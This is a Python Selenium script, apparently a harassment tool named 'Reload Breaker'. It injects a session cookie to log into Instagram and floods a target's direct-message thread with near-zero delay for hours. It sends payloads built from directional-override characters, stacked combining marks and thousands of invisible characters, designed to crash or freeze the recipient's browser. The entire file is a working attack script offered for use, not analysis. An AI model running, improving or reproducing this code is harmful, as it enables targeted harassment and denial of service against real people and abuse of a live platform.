# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (RELOAD BREAKER)
# 📅 STATUS: INIT-CRASH MODE | 2 THREADS | HYPER-SPEED

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- RELOAD BREAKER CONFIG ---
THREADS = 2             
TOTAL_DURATION = 21600  
BURST_SPEED = (0.01, 0.04) # Near-zero delay
SESSION_LIMIT = 50 # Reloading our own browser faster to stay ahead

def get_reload_breaker_payload(target):
    """Generates a payload designed to crash the browser during initial load."""
    # Recursive Directional Overrides (The 'Layout Killer')
    # This flips the browser's rendering direction back and forth instantly
    direction_chaos = ("\u202E" + "\u202D") * 50 
    
    # Mathematical Bold Script (High-cost vectors)
    praveer_text = "𝐏𝐑𝐀𝐕𝐄𝐄𝐑_𝐍𝐂_𝐎𝐖𝐍𝐙_𝐘𝐎𝐔"
    
    # Mega-Zalgo (60 marks high)
    z_tower = "̸" * 60
    
    # 5,000 character invisible 'buffer' to bloat the initial JSON response
    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(5000))
    
    lines = []
    lines.append(f"☢️ RELOAD FAILED: {target.upper()} ☢️")
    lines.append(bloat)
    for _ in range(25): # Massive Vertical Wall
        lines.append(direction_chaos + praveer_text + z_tower)
    lines.append(bloat)
    
    return "\n".join(lines)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new") 
    chrome_options.add_argument("--no-sandbox") 
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    # Forces the browser to ignore cache, making every reload of theirs slower
    chrome_options.add_argument("--disk-cache-size=1")
    chrome_options.add_argument("--media-cache-size=1")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"breaker_{agent_id}_{int(time.time())}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def adaptive_inject(driver, text):
    try:
        box = driver.find_element(By.XPATH, "//div[@role='textbox']")
        driver.execute_script("""
            var el = arguments[0];
            el.focus();
            document.execCommand('insertText', false, arguments[1]);
            el.dispatchEvent(new Event('input', { bubbles: true }));
        """, box, text)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        session_start = time.time()
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(6)

            while (time.time() - session_start) < SESSION_LIMIT:
                payload = get_reload_breaker_payload(os.getenv("TARGET_NAME", "Target"))
                if adaptive_inject(driver, payload):
                    print(f"[!] BREAK-SENT | MODE: RELOAD_KILLER", flush=True)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass 
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(1)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    raw_url = os.environ.get("GROUP_URL", "").strip()
    target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS): executor.submit(run_life_cycle, i+1, cookie, target_id)

if __name__ == "__main__":
    main()
